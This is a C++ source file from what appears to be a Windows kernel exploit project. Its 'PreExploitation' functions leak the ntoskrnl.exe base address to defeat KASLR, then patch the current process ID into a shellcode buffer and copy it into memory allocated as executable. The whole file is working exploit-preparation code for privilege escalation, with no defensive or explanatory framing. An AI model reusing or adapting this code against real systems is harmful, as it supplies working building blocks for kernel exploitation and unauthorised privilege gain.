#include "PreExploitation.hpp"
#include "ByteVectorUtils.hpp"
#include "WindowsException.hpp"

#include <Psapi.h>

namespace PreExploitation
{

Address64 leak_ntos_base()
{
	const std::wstring_view NTOS_NAME = L"ntoskrnl.exe";
	static constexpr DWORD MAX_DRIVERS = 1024;
	std::vector<Address64> drivers_base_addresses;
	drivers_base_addresses.resize(MAX_DRIVERS);
	DWORD bytes_needed = 0;

	const BOOL enum_drivers_result = EnumDeviceDrivers(reinterpret_cast<LPVOID *>(drivers_base_addresses.data()), MAX_DRIVERS, &bytes_needed);
	if (enum_drivers_result == FALSE)
	{
		throw WindowsException(ArcaneErrors::ErrorCodes::EnumDeviceDriversFailed);
	}

	const size_t driver_count = bytes_needed / sizeof(Address64);
	for (size_t i = 0; i < driver_count; i++)
	{
		wchar_t current_name[MAX_PATH] = { 0 };
		const DWORD get_driver_name_result = GetDeviceDriverBaseNameW(reinterpret_cast<LPVOID>(drivers_base_addresses[i]), current_name, MAX_PATH);
		if (get_driver_name_result == NULL)
		{
			throw WindowsException(ArcaneErrors::ErrorCodes::GetDeviceDriverBaseNameWFailed);
		}

		if (NTOS_NAME.compare(current_name) == 0)
		{
			DEBUG_PRINT("[+] NTOS base found (KASLR leak): ");
			DEBUG_PRINT(std::to_string(drivers_base_addresses[i]));

			return drivers_base_addresses[i];
		}
	}

	return 0;
}

Address64 prepare_shellcode()
{
	uint32_t pid = GetCurrentProcessId();
	ByteVector pid_raw = ByteVectorUtils::uint32_to_byte_vector(pid);
	std::memcpy(SHELLCODE.data() + PID_OFFSET, pid_raw.data(), sizeof(uint32_t));

	Address64 shellcode_address = reinterpret_cast<Address64>(VirtualAlloc(nullptr, PAGE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
	if (shellcode_address == NULL)
	{
		throw WindowsException(ArcaneErrors::ErrorCodes::VirtualAllocFailed);
	}
	std::memcpy(reinterpret_cast<void*>(shellcode_address), SHELLCODE.data(), sizeof(SHELLCODE));

	return shellcode_address;
}

}